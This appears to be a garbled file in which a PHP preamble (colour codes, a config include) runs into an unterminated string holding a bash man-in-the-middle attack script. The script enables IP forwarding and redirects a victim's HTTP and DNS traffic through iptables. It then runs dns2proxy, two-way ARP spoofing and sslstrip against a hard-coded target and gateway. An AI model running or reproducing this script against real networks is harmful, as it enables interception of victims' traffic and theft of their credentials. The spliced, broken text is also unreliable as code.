<?php 
 
//Warna// 
$merah = "\033[0;31m"; 
$biru = "\033[1;34m"; 
$kuning = "\033[0;33m"; 
$ijo = "\033[0;32m"; 
$putih = "\033[0;37m"; 
//end Warna// 
@error_reporting(0); 
require('fp_config.php'); 
$jsn = json_decode($json); 
$banner = "{$biru}
target="192.168.43.179"

gateway="192.168.43.1"

interface="wlp3s0"

echo 1 > /proc/sys/net/ipv4/ip_forward

iptables --flush

iptables -t nat --flush

iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 9000

iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53

xterm -hold -e " python2 /home/mrikum7/sslstrip/dns2proxy-master/dns2proxy.py " & sleep 1 &

xterm -e " arpspoof -i $interface -t $target $gateway " & sleep 1 &

xterm -e " arpspoof -i $interface -t $gateway $target " & sleep 1 &

xterm -hold -e " sslstrip -l 9000 "

?>

